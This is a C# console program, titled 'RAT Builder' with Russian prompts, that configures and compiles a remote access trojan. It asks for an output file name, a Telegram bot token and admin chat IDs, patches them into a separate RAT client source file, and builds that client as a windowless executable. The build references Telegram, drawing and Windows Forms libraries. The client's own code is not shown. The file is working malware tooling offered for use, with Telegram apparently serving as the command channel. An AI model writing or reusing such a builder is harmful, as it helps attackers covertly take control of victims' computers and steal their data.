using System;
using System.IO;
using System.Diagnostics;

class Builder
{
    static void Main()
    {
        Console.WriteLine("=== RAT Builder ===");
        Console.Write("Имя итогового exe-файла (без .exe): ");
        string exeName = Console.ReadLine()?.Trim();
        if (string.IsNullOrWhiteSpace(exeName)) exeName = "rat_client";

        Console.Write("Токен Telegram-бота: ");
        string botToken = Console.ReadLine()?.Trim();
        if (string.IsNullOrWhiteSpace(botToken))
        {
            Console.WriteLine("Токен не может быть пустым!");
            return;
        }

        Console.Write("Chat ID (через запятую): ");
        string chatIds = Console.ReadLine()?.Trim();
        if (string.IsNullOrWhiteSpace(chatIds))
        {
            Console.WriteLine("Chat ID не может быть пустым!");
            return;
        }

        // Определяем абсолютный путь к Program.cs относительно этого файла
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        string srcPath = Path.Combine(baseDir, "razvRATnik", "Program.cs");
        string tempPath = Path.Combine(baseDir, "Builder_temp.cs");
        if (!File.Exists(srcPath))
        {
            Console.WriteLine($"Файл не найден: {srcPath}");
            return;
        }
        string orig = File.ReadAllText(srcPath);

        // Патчим botToken и adminChatIds
        orig = PatchValue(orig, "private static string botToken = ", botToken, true);
        orig = PatchValue(orig, "private static List<long> adminChatIds = new List<long> {", chatIds, false);
        File.WriteAllText(tempPath, orig);

        // Компилируем
        string outDir = "builder_out";
        Directory.CreateDirectory(outDir);
        string outExe = Path.Combine(outDir, exeName + ".exe");
        string args = $"/target:winexe /out:{outExe} {tempPath} /reference:System.Drawing.Common.dll /reference:Telegram.Bot.dll /reference:System.Windows.Forms.dll";
        var proc = Process.Start(new ProcessStartInfo("csc", args) { RedirectStandardOutput = true, UseShellExecute = false });
        proc.WaitForExit();
        Console.WriteLine(File.Exists(outExe) ? $"Сборка успешна: {outExe}" : "Ошибка сборки!");
        File.Delete(tempPath);
    }

    static string PatchValue(string src, string marker, string value, bool isString)
    {
        int idx = src.IndexOf(marker);
        if (idx == -1) return src;
        int start = src.IndexOf('=', idx) + 1;
        int end = src.IndexOf(';', start);
        string before = src.Substring(0, start);
        string after = src.Substring(end);
        string val = isString ? $" \"{value}\"" :
            " new List<long> { " + string.Join(", ", value.Split(',')) + " }";
        return before + val + after;
    }
} 